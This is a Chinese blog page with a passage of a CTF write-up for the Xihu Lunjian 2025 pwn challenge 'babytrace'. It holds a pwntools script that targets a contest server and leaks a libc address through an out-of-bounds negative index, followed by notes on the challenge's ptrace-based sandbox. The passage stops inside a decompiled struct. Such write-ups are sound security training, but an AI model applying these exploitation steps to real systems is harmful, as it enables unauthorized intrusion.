<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="zh-CN" data-mode="dark">
  <head>
  <style>
    #canvas-dust {
      z-index: -65536;
      pointer-events: none;
      position: fixed;
      top: 0;
      left: 0;
    }
  </style>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" >
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路" />
<meta name="author" content="imLZH1" />
<meta property="og:locale" content="zh_CN" />
<meta name="description" content="‍" />
<meta property="og:description" content="‍" />
<link rel="canonical" href="http://localhost:4000/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" />
<meta property="og:url" content="http://localhost:4000/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" />
<meta property="og:site_name" content="imLZH1’ Blog" />
<meta property="og:image" content="/assets/img/2025-CTFWP-images/2025-xhlj/icon.jpeg" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-18T00:00:00+08:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="/assets/img/2025-CTFWP-images/2025-xhlj/icon.jpeg" />
<meta property="twitter:title" content="第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"imLZH1"},"dateModified":"2025-01-18T00:00:00+08:00","datePublished":"2025-01-18T00:00:00+08:00","description":"‍","headline":"第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路","image":"/assets/img/2025-CTFWP-images/2025-xhlj/icon.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"},"url":"http://localhost:4000/posts/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9B-Pwn-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"}</script>
<!-- End Jekyll SEO tag -->


  <title>第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路 | imLZH1' Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="imLZH1' Blog">
<meta name="application-name" content="imLZH1' Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  
    

    <link rel="stylesheet" href="/assets/lib/fonts/main.css">
  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/lib/bootstrap/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/lib/fontawesome-free/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  
    <link rel="stylesheet" href="/assets/lib/tocbot/tocbot.min.css">
  

  
    <link rel="stylesheet" href="/assets/lib/loading-attribute-polyfill/loading-attribute-polyfill.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="/assets/lib/magnific-popup/magnific-popup.css">
  

  <!-- JavaScript -->

  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<canvas id="canvas-dust"></canvas>
<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/tx.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <h1 class="site-title">
      <a href="/">imLZH1' Blog</a>
    </h1>
    <!--
    <p class="site-subtitle fst-italic mb-0"></p>
    -->
    <p id="copywriting" class="site-subtitle fst-italic mb-0"></p>

    <script text="javascript">
          fetch('/assets/index_about.json',{headers:({
            'copywriting.jsion': 'application/x-www-form-urlencoded'
          })})
          .then(function(response) {
            return response.json();
          })
          .then(function(myJson) {
            var max = myJson.length;
            var copywritingId = Math.ceil(Math.random()*max)-1;
            console.log(`%c
      _    _.--.____.--._
     ( )=.-":;:;:;;':;:;:;"-._
      \\\\:;:;:;:;:;;:;::;:;:;:\\
       \\\\:;:;:;:;:;;:;:;:;:;:;\\
        \\\\:;::;:;:;:;:;::;:;:;:\\
         \\\\:;:;:;:;:;;:;::;:;:;:\\
          \\\\:;::;:;:;:;:;::;:;:;:\\
           \\\\;;:;:_:--:_:_:--:_;:;\\
            \\\\_.-"             "-._\\
             \\\\
              \\\\
               \\\\
                \\\\
                 \\\\
                  \\\\\ `,'color: #03A9F4; font-weight: bold');
            console.log(`%c `+myJson[copywritingId], `color: #03A9F4; font-weight: bold`);
            document.getElementById('copywriting').innerHTML = myJson[copywritingId];
          });
          </script>
	<script>
		'use strict';
		function getElement(string, item = document.documentElement) {
		    let tmp = item.querySelector(string);
		    if (tmp === null) {
			throw new Error("Unknown HTML");
		    }
		    return tmp;
		}
		function getParent(item, level = 1) {
		    while (level--) {
			let tmp = item.parentElement;
			if (tmp === null) {
			    throw new Error("Unknown HTML");
			}
			item = tmp;
		    }
		    return item;
		}
		function format(format, ...args) {
		    return format.replaceAll(/\$\*?[0-9]*/g, (match) => {
			if (match === '$*') {
			    return '';
			}
			let Index = match.slice(1);
			if (Index >= args.length) {
			    return '';
			}
			return args[Index];
		    });
		}
		class dust {
		    constructor(x = 50, y = 50) {
			this.vx = Math.random() * 1 + 1;
			this.vy = Math.random() * 1 + 0.01;
			this.shadowBlur = Math.random() * 3;
			this.shadowX = (Math.random() * 2) - 1;
			this.shadowY = (Math.random() * 2) - 1;
			this.radiusX = Math.random() * 1.5 + 0.5;
			this.radiusY = this.radiusX * (Math.random() * (1.3 - 0.3) + 0.3);
			this.rotation = Math.PI * Math.floor(Math.random() * 2);
			this.x = x;
			this.y = y;
		    }
		}
		class canvasDust {
		    constructor(canvasID) {
			this.color = '#fff';
			this.width = 300;
			this.height = 300;
			this.dustQuantity = 50;
			this.dustArr = [];
			this.inStop = false;
			this.build = () => {
			    this.resize();
			    if (this.ctx) {
				const point = canvasDust.getPoint(this.dustQuantity);
				for (let i of point) {
				    const dustObj = new dust(i[0], i[1]);
				    this.buildDust(dustObj);
				    this.dustArr.push(dustObj);
				}
				requestAnimationFrame(this.paint);
			    }
			};
			this.paint = () => {
			    if (this.inStop) {
				return;
			    }
			    const dustArr = this.dustArr;
			    for (let i of dustArr) {
				this.ctx.clearRect(i.x - 6, i.y - 6, 12, 12);
				if (i.x < -5 || i.y < -5) {
				    const x = this.width;
				    const y = Math.floor(Math.random() * window.innerHeight);
				    i.x = x;
				    i.y = y;
				}
				else {
				    i.x -= i.vx;
				    i.y -= i.vy;
				}
			    }
			    for (let i of dustArr) {
				this.buildDust(i);
			    }
			    requestAnimationFrame(this.paint);
			};
			this.buildDust = (dust) => {
			    const ctx = this.ctx;
			    ctx.beginPath();
			    ctx.shadowBlur = dust.shadowBlur;
			    ctx.shadowOffsetX = dust.shadowX;
			    ctx.shadowOffsetY = dust.shadowY;
			    ctx.ellipse(dust.x, dust.y, dust.radiusX, dust.radiusY, dust.rotation, 0, Math.PI * 2);
			    ctx.closePath();
			    ctx.fill();
			};
			this.resize = () => {
			    const canvas = this.canvas;
			    const width = window.innerWidth;
			    const height = window.innerHeight;
			    this.width = width;
			    this.height = height;
			    this.dustQuantity = Math.floor((width + height) / 38);
			    canvas.width = width;
			    canvas.height = height;
			    this.ctx.shadowColor =
				this.ctx.fillStyle = this.color;
			};
			this.stop = () => {
			    this.inStop = true;
			};
			this.play = () => {
			    if (this.inStop === true) {
				this.inStop = false;
				requestAnimationFrame(this.paint);
			    }
			};
			const canvas = getElement(canvasID);
			this.canvas = canvas;
			this.ctx = this.canvas.getContext('2d');
			this.build();
			window.addEventListener('resize', this.resize);
		    }
		}
		canvasDust.getPoint = (number = 1) => {
		    let point = [];
		    for (let i = 0; i < number; ++i) {
			const x = Math.floor(Math.random() * window.innerWidth);
			const y = Math.floor(Math.random() * window.innerHeight);
			point.push([x, y]);
		    }
		    return point;
		};
		try {
		    var canvasDusts = new canvasDust('#canvas-dust');
		}
		catch (e) { }
	  </script>	
	  


  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>首页</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>归档</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>关于</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/Friends/" class="nav-link">
            <i class="fa-fw fas fa-user-friends"></i>
            

            <span>FRIENDS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    

    
      

      
        <a
          href="https://github.com/imLZH1"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github-alt"></i>
        </a>
      
    
      

      
        <a
          href="javascript:location.href = 'mailto:' + ['qingwachong','qq.com'].join('@')"
          aria-label="email"
          

          

          

          
        >
          <i class="fas fa-envelope"></i>
        </a>
      
    
      

      
        <a
          href="/feed.xml"
          aria-label="rss"
          

          

          

          
        >
          <i class="fas fa-rss"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">
                首页
              </a>
            </span>

          
        
          
        
          
            
              <span>第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      文章
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="搜索..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">取消</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  

  
  

  




<!-- return -->




<article class="px-1">
  <header>
    <h1 data-toc-skip>第八届西湖论剑-网络攻防实战赛初赛-Pwn-解题思路</h1>

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        发表于
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737129600"
  data-df="YYYY/MM/DD"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  2025/01/18
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/2025-CTFWP-images/2025-xhlj/icon.jpeg" class="popup img-link preview-img shimmer"><img src="/assets/img/2025-CTFWP-images/2025-xhlj/icon.jpeg"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          作者

          <em>
            
              
                
                
              
            
          </em>
        </span>

        <!-- read time -->
        <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2489 字"
>
  <em>13 分钟</em>阅读</span>

      </div>
      <!-- .d-flex -->
    </div>
    <!-- .post-meta -->
  </header>

  <div class="content">
    <p>‍</p>

<blockquote>
  <p>第八届西湖论剑·中国杭州网络安全安全技能大赛-网络攻防实战赛初赛
‍</p>
</blockquote>

<h2 id="pwn-babytrace"><span class="me-2">Pwn-babytrace</span><a href="#pwn-babytrace" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<p>patch 成这样，方便调试</p>

<p>​<a href="/assets/img/2025-CTFWP-images/2025-xhlj/assets/image-20250118221820-zgisvdf.png" class="popup img-link  shimmer"><img src="/assets/img/2025-CTFWP-images/2025-xhlj/assets/image-20250118221820-zgisvdf.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>调试脚本</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
</pre></td><td class="rouge-code"><pre><span class="c1"># imLZH1
</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1">#from ctypes import CDLL
#cdl = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
</span><span class="n">s</span>    <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sa</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">sl</span>   <span class="o">=</span> <span class="k">lambda</span>   <span class="n">x</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">sla</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">,</span><span class="n">y</span> <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">)</span>
<span class="n">r</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">ru</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">rl</span>   <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
<span class="n">itr</span>  <span class="o">=</span> <span class="k">lambda</span>     <span class="p">:</span> <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u32</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">u64</span><span class="p">(</span><span class="n">x</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>   <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
<span class="n">lss</span>  <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>   <span class="p">:</span> <span class="nf">ls</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s -&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">x</span><span class="p">)))</span>

<span class="n">attack</span> <span class="o">=</span> <span class="sh">'</span><span class="s">119.45.238.17:9999</span><span class="sh">'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./babytrace</span><span class="sh">'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./fix/babytrace</span><span class="sh">'</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span><span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">.</span><span class="n">TAG</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REM</span><span class="p">:</span><span class="k">return</span> <span class="nf">remote</span><span class="p">(</span><span class="o">*</span><span class="n">attack</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">))</span>
    <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="nf">context</span><span class="p">(</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span><span class="p">,</span> <span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span><span class="p">,</span>
<span class="n">terminal</span><span class="o">=</span><span class="sh">'</span><span class="s">tmux splitw -h -l 170</span><span class="sh">'</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sh">'</span><span class="s"> </span><span class="sh">'</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span><span class="p">.</span><span class="n">libc</span>
<span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="c1">#print(context.binary.libs)
#libc = ELF('./libc.so.6')
</span>
<span class="c1">#import socks
#context.proxy = (socks.SOCKS5, '192.168.31.251', 10808)
</span>
<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
#brva 0x0D68
brva 0x000D3C
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="c1">#io = rmote()
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">([])</span>
<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">idx</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">choose one &gt;</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">:</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">which one?</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">set value?</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">choose one &gt;</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">which one?</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>

<span class="nf">sleep</span><span class="p">(</span><span class="mf">0.4</span><span class="p">)</span>

<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">pid</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">gdbscript</span><span class="p">)</span>

<span class="c1">#pause()
</span><span class="nf">show</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">num[-2] = </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">rl</span><span class="p">())</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_2_1_stderr_</span><span class="sh">'</span><span class="p">]</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<h3 id="程序分析"><span class="me-2">程序分析</span><a href="#程序分析" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>父进程通过监控和修改子进程的系统调用及其寄存器状态，实现了一个自定义的沙箱环境。</li>
</ul>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="rouge-code"><pre><span class="k">struct</span> <span class="n">user_regs_struct</span>
<span class="p">{</span>
  <span class="n">__int64</span> <span class="n">r15</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">r14</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">r13</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">r12</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">rbp</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">rbx</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">r11</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">r10</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">r9</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">r8</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">rax</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">rcx</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">rdx</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">rsi</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">rdi</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">orig_rax</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">rip</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">cs</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">eflags</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">rsp</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">ss</span><span class="p">;</span>
  <span class="n">__int64</span> <span class="n">fs_base</span><span class="p">;</span>
